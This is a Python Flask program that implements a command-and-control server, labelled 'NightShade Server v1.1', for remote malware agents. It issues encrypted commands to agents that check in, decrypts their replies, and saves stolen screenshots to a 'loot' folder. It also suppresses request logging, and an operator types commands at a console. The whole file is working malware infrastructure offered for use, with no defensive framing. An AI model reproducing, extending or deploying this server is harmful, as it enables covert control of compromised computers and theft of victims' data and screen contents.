from flask import Flask, request
from cryptography.fernet import Fernet
import threading
import time
import logging
import os

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

with open("key.vault", "rb") as f:
    cipher = Fernet(f.read())

current_cmd = "sysinfo" 
LOOT_DIR = "loot"
if not os.path.exists(LOOT_DIR): os.makedirs(LOOT_DIR)

@app.route('/get_command', methods=['GET'])
def send_cmd():
    global current_cmd
    token = cipher.encrypt(current_cmd.encode())
    cmd_to_send = current_cmd
    current_cmd = "whoami" 
    return token

@app.route('/post_result', methods=['POST'])
def receive_res():
    try:
        enc_data = request.form.get('result')
        decrypted_bytes = cipher.decrypt(enc_data.encode())
        print("\n" + "="*30)
        print(f"[*] DATA RECEIVED AT {time.strftime('%H:%M:%S')}")
        if decrypted_bytes.startswith(b'\x89PNG'):
            filename = f"{LOOT_DIR}/screenshot_{int(time.time())}.png"
            with open(filename, "wb") as f:
                f.write(decrypted_bytes)
            print(f"[!] SCREENSHOT SAVED TO: {filename}")
        else:
            print("-" * 30)
            print(decrypted_bytes.decode(errors='replace'))
        print("="*30)
        print("\nEnter command: ", end="")
        return "OK"
    except Exception as e:
        print(f"\n[!] Server Error: {e}")
        return "Error", 500

def cli():
    global current_cmd
    while True:
        val = input("Enter command: ")
        if val: 
            current_cmd = val

if __name__ == "__main__":
    threading.Thread(target=cli, daemon=True).start()
    print("[+] NightShade Server v1.1 Started on Port 5000")
    print("[+] Waiting for agent check-in...")
    app.run(port=5000)